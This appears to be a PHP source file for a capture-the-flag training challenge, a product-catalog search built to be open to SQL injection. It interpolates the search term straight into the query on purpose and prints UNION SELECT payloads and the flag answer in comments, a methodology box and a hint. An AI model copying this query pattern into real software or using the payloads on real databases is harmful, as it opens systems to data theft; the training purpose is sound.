<?php
declare(strict_types=1);

require_once ROOT_PATH . '/config.php';
require_once ROOT_PATH . '/includes/challenge_view.php';

// ══════════════════════════════════════════════════════════════════════════════
//  Challenge 2 – SQL Injection: UNION Data Exfiltration
//  VULNERABILITY: Product catalog search interpolated into SQL LIKE statement.
//  Payload: ' UNION SELECT 1, key, value, 4, 5 FROM secrets--
// ══════════════════════════════════════════════════════════════════════════════

$db = get_db();
$results = [];
$sql_shown = '';
$error_msg = '';

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['q'])) {
    $q = $_GET['q'] ?? '';
    $sql = "SELECT id, name, category, price, description FROM products WHERE name LIKE '%$q%' OR category LIKE '%$q%'";
    $sql_shown = $sql;

    try {
        $results = $db->query($sql)->fetchAll();
    } catch (\PDOException $e) {
        $error_msg = 'SQL Error: ' . htmlspecialchars($e->getMessage(), ENT_QUOTES, 'UTF-8');
    }
}

// ── Scenario HTML ─────────────────────────────────────────────────────────────
ob_start();
?>
<div class="cylab-scenario-content">
    <p class="scenario-intro">
        Can you exfiltrate sensitive secrets from the target database?
        The product catalog search parameter is interpolated into a SQL SELECT statement without sanitization. Formulate a <strong>UNION SELECT</strong> payload to pivot into the restricted <code class="mono-inline">secrets</code> relation.
    </p>

    <div class="cylab-info-box">
        <h4 class="info-box-title">Execution Objective</h4>
        <ul class="cylab-checklist">
            <li>Probe the query endpoint to determine the required SELECT column count.</li>
            <li>Construct a matching UNION SELECT payload targeting the <code class="mono-inline">secrets</code> table.</li>
            <li>Extract the row where <code class="mono-inline">key = 'ctf_flag'</code> and submit the token.</li>
        </ul>
    </div>

    <div class="cylab-theory-box">
        <h4 class="info-box-title">Theoretical Methodology</h4>
        <pre><code class="language-sql">-- Step 1: Probe column count
' ORDER BY 5--   -- Valid (5 columns)

-- Step 2: Target secrets table
' UNION SELECT 1, key, value, 4, 5 FROM secrets WHERE key='ctf_flag'--</code></pre>
    </div>
</div>
<?php
$scenario_html = ob_get_clean();

// ── Playground HTML ───────────────────────────────────────────────────────────
ob_start();
?>
<div class="cylab-playground-card" id="vuln-interactive">
    <div class="playground-card-header">
        <h4 class="playground-card-title">Target Query Console</h4>
        <span class="playground-card-endpoint">Target Endpoint: <code class="mono-inline">ShopEZ Catalog Service</code></span>
    </div>

    <form method="GET" novalidate id="search-form" class="cylab-vuln-form">
        <input type="hidden" name="page" value="challenge_sqli_search">
        <div class="button-row">
            <div class="input-container flex-1">
                <span class="input-prefix-icon"><?= svg_icon('search', '', 15) ?></span>
                <input
                    type="text"
                    name="q"
                    id="search-input"
                    class="form-control"
                    placeholder="Search products..."
                    value="<?= isset($_GET['q']) ? e($_GET['q']) : '' ?>"
                    autocomplete="off"
                >
            </div>
            <button type="submit" class="btn btn-secondary" id="search-btn">Search</button>
        </div>
    </form>

    <?php if ($error_msg): ?>
    <div class="result-box result-error mt-3" id="search-error">
        <code><?= $error_msg ?></code>
    </div>
    <?php endif; ?>

    <?php if (!empty($results)): ?>
    <div class="table-surface-card mt-3">
        <table class="saas-data-table" id="search-results">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Name</th>
                    <th>Category</th>
                    <th>Price</th>
                    <th>Description</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($results as $r): ?>
                <tr>
                    <td class="mono text-xs">#<?= e((string)$r['id']) ?></td>
                    <td class="font-medium text-primary"><?= e((string)$r['name']) ?></td>
                    <td><span class="badge badge-subtle"><?= e((string)$r['category']) ?></span></td>
                    <td><?= e((string)$r['price']) ?></td>
                    <td class="text-secondary text-sm"><?= e((string)$r['description']) ?></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <?php elseif (isset($_GET['q']) && !$error_msg): ?>
    <div class="result-box result-info mt-3" id="no-results">
        No catalog products found matching: <code class="mono-inline"><?= e($_GET['q']) ?></code>
    </div>
    <?php endif; ?>
</div>
<?php
$playground_html = ob_get_clean();

$hint = "Both branches of UNION must return 5 columns: ' UNION SELECT 1, key, value, 4, 5 FROM secrets--";
$artifacts = [
    'catalog.db schema' => '#vuln-interactive',
    'query_endpoint'    => '#vuln-interactive',
];

render_cylab_challenge_view('sqli_search', $scenario_html, $playground_html, $hint, $artifacts);
